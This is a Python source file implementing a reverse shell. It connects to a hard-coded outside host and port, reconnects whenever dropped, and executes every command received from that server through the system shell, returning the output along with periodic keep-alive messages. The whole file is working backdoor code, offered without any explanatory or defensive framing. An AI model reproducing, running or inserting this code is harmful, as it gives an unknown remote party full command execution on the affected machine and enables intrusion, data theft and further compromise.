import socket
import subprocess
import threading
import time

# Configuration
SERVER_IP = 's8.serv00.com'
SERVER_PORT = 63098
KEEP_ALIVE_INTERVAL = 10  # Send a keep-alive message every 10 seconds

# Global flag to ensure only one connection
is_connected = False
client_socket = None

# Function to connect to the server
def connect_to_server(ip, port):
    global is_connected, client_socket
    while not is_connected:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((ip, port))
            print(f"Connected to server at {ip}:{port}")
            is_connected = True
            return client_socket
        except Exception as e:
            print(f"Error connecting to server: {e}. Retrying in 2 seconds...")
            if client_socket:
                client_socket.close()
                client_socket = None
            time.sleep(2)  # Wait for 2 seconds before retrying

# Function to execute commands received from the server
def execute_commands():
    global is_connected, client_socket
    last_keep_alive = time.time()
    while is_connected:
        try:
            if not client_socket:
                print("Socket is closed. Exiting command execution thread.")
                break

            # Check for incoming commands
            ready_to_read, _, _ = select.select([client_socket], [], [], 1)
            if ready_to_read:
                command = client_socket.recv(1024).decode('utf-8').strip()
                if not command:
                    print("Connection closed by the server.")
                    is_connected = False
                    client_socket.close()
                    client_socket = None
                    break
                print(f"Received command: {command}")
                # Execute the command locally
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
                stdout, stderr = process.communicate()
                # Send the output back to the server
                response = stdout.decode('utf-8') if stdout else stderr.decode('utf-8')
                client_socket.send(response.encode('utf-8'))

            # Send keep-alive message if enough time has passed
            if time.time() - last_keep_alive > KEEP_ALIVE_INTERVAL:
                client_socket.send("KEEP_ALIVE".encode('utf-8'))
                last_keep_alive = time.time()

        except Exception as e:
            print(f"Error executing command: {e}")
            is_connected = False
            if client_socket:
                client_socket.close()
                client_socket = None
            break

# Main function
if __name__ == '__main__':
    import select  # For non-blocking I/O

    while True:
        # Connect to the server
        connect_to_server(SERVER_IP, SERVER_PORT)
        if is_connected and client_socket:
            # Start a thread to handle commands
            command_thread = threading.Thread(target=execute_commands)
            command_thread.daemon = True
            command_thread.start()

            # Keep the main thread alive and monitor the connection
            while is_connected:
                time.sleep(1)  # Sleep briefly to avoid high CPU usage

            # If the connection is lost, wait for the command thread to finish
            command_thread.join()
            print("Connection lost. Attempting to reconnect...")